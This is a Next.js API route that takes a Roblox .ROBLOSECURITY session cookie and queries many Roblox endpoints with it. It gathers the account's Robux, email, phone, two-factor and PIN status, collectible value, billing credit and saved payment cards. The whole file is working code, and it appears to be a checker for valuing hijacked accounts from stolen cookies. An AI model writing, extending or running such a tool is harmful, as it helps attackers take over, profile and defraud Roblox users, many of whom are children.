import { NextResponse } from "next/server"

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

async function rbGet(url: string, cookie: string) {
  const r = await fetch(url, {
    headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` },
  })
  if (!r.ok) throw new Error(`HTTP ${r.status}`)
  return r.json().catch(() => ({}))
}

export async function POST(req: Request) {
  try {
    const { cookie } = await req.json()
    if (!cookie || cookie.length < 50) {
      return NextResponse.json({ error: "Invalid cookie" }, { status: 400 })
    }

    // Validate cookie
    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` },
    })
    if (!authRes.ok) {
      return NextResponse.json({ error: "Invalid or expired cookie" }, { status: 401 })
    }

    const auth = await authRes.json()
    const uid = auth.id
    const username = auth.name

    const data: any = {
      username,
      uid,
      displayName: auth.displayName,
      robux: 0,
      premium: false,
      avatarUrl: null,
      created: null,
      ageDays: null,
      about: null,
      email: null,
      emailVerified: false,
      phone: null,
      phoneVerified: false,
      twoFa: false,
      pin: false,
      country: null,
      friends: 0,
      followers: 0,
      followings: 0,
      groupsOwned: 0,
      groupsTotal: 0,
      badges: 0,
      wearing: 0,
      games: 0,
      verified: false,
      pendingRobux: 0,
      rap: 0,
      billing: null,
      csrf: null,
      cards: 0,
    }

    // Parallel fetch all info
    const fetches: Promise<void>[] = []

    fetches.push((async () => {
      try {
        const d = await rbGet(`https://economy.roblox.com/v1/users/${uid}/currency`, cookie)
        data.robux = d.robux || 0
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, {
          headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` },
        })
        data.premium = r.ok
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png`, { headers: { "User-Agent": UA } })
        const d = await r.json()
        data.avatarUrl = (d.data?.[0]?.imageUrl) || null
      } catch {}
    })())

    fetches.push((async () => {
      try { const d = await rbGet(`https://users.roblox.com/v1/users/${uid}`, cookie); data.created = d.created?.split("T")[0] || null; data.about = (d.description || "").substring(0, 50) || null; data.verified = d.hasVerifiedBadge || false } catch {}
      if (data.created) { const diff = Date.now() - new Date(data.created).getTime(); data.ageDays = Math.floor(diff / 86400000) }
    })())

    fetches.push((async () => { try { const d = await rbGet(`https://friends.roblox.com/v1/users/${uid}/friends/count`, cookie); data.friends = d.count || 0 } catch {} })())
    fetches.push((async () => { try { const d = await rbGet(`https://friends.roblox.com/v1/users/${uid}/followers/count`, cookie); data.followers = d.count || 0 } catch {} })())
    fetches.push((async () => { try { const d = await rbGet(`https://friends.roblox.com/v1/users/${uid}/followings/count`, cookie); data.followings = d.count || 0 } catch {} })())

    fetches.push((async () => {
      try {
        const r = await fetch("https://accountsettings.roblox.com/v1/email", { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        data.email = d.emailAddress || null
        data.emailVerified = d.verified || false
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch("https://accountsettings.roblox.com/v1/phone", { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        data.phone = d.phone || null
        data.phoneVerified = d.isVerified || false
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        data.twoFa = d.is2faEnabled || false
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch("https://auth.roblox.com/v1/account/pin", { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        data.pin = d.isEnabled || false
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch("https://users.roblox.com/v1/users/authenticated/country-code", { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        data.country = d.countryCode || null
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const d = await rbGet(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, cookie)
        data.groupsTotal = (d.data || []).length
        data.groupsOwned = (d.data || []).filter((g: any) => g.role?.rank === 255).length
      } catch {}
    })())

    fetches.push((async () => {
      try { const d = await rbGet(`https://accountinformation.roblox.com/v1/users/${uid}/roblox-badges`, cookie); data.badges = Array.isArray(d) ? d.length : 0 } catch {}
    })())

    fetches.push((async () => {
      try { const d = await rbGet(`https://avatar.roblox.com/v1/users/${uid}/currently-wearing`, cookie); data.wearing = (d.assetIds || []).length } catch {}
    })())

    fetches.push((async () => {
      try { const d = await rbGet(`https://games.roblox.com/v2/users/${uid}/games?accessFilter=Public&limit=50`, cookie); data.games = (d.data || []).length } catch {}
    })())

    fetches.push((async () => {
      try {
        const d = await rbGet(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Year&transactionType=summary`, cookie)
        data.pendingRobux = d.pendingRobuxTotal || 0
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const d = await rbGet(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?sortOrder=Asc&limit=100`, cookie)
        data.rap = (d.data || []).reduce((s: number, i: any) => s + (i.recentAveragePrice || 0), 0)
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch("https://billing.roblox.com/v1/credit", { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        const bal = d.balance || 0
        const cur = d.currencyCode || "USD"
        const ramt = d.robuxAmount || 0
        data.billing = `${bal} ${cur} (${ramt} R$)`
      } catch {}
    })())

    fetches.push((async () => {
      try {
        const r = await fetch("https://apis.roblox.com/payments-gateway/v1/payment-profiles", { headers: { "User-Agent": UA, Cookie: `.ROBLOSECURITY=${cookie}` } })
        const d = await r.json().catch(() => ({}))
        data.cards = Array.isArray(d) ? d.length : 0
      } catch {}
    })())

    await Promise.allSettled(fetches)

    return NextResponse.json(data)
  } catch (error) {
    console.error("[ROBLOX_COOKIE]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}
